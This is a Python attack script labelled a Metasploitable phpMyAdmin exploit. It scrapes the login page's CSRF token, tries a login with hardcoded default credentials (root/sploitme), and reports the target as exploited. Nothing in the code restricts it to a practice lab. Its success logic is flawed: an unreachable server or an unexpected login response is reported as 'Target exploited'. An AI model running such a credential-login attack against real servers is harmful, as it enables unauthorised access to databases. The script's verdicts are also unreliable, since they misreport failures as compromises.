#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

import logging

log = logging.getLogger(__name__)


class PHPMyAdmin:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__path = "/phpmyadmin/index.php"
        self.__token = None
        self.__requests = requests.session()

    def __csrf(self):
        log.debug(f"[!] Getting CSRF Token ({self.__host})")
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        if r.status_code != 200:
            log.info(f"[!] Unable to get CSRF Token. PHPMyAdmin not up ({self.__host})")
            return False
        if 'name="token" value=' not in r.text:
            log.info(f"[!] Unable to get CSRF Token. PHPMyAdmin not up ({self.__host})")
            return False
        soup = BeautifulSoup(r.text, "lxml")
        self.__token = soup.select_one('input[name="token"]')["value"]
        return True

    def __exploit(self):
        params = {
            "pma_username": "root",
            "pma_password": "sploitme",
            "server": "1",
            "token": self.__token,
        }
        r = self.__requests.post(
            f"http://{self.__host}:{self.__port}{self.__path}", params=params
        )
        if r.status_code != 200:
            log.info(f"[*] Error logging into PHPMyAdmin ({self.__host})")
            return False
        soup = BeautifulSoup(r.text, "lxml")
        title = soup.find("title").text
        if "phpMyAdmin 3.5.8" in title:
            log.info(f"[!] PHPMyAdmin is vulnerable ({self.__host})")
            return True
        if not "Cannot log in to the MySQL server" in r.text:
            log.info(f"[!] Issue with login. Unexpected return data ({self.__host})")
            return True
        log.info(f"[!] PHPMyAdmin is secure ({self.__host})")
        return False

    def run(self, host, port=None):
        self.__host = host
        log.debug(f"[*] Exploiting PHPMyAdmin ({self.__host})")
        if port:
            self.__port = port
        if not self.__csrf():
            return True
        return self.__exploit()


def main(args):
    log.info("[+] Metasploitable PHPMyAdmin exploit by xentrick")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = PHPMyAdmin()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
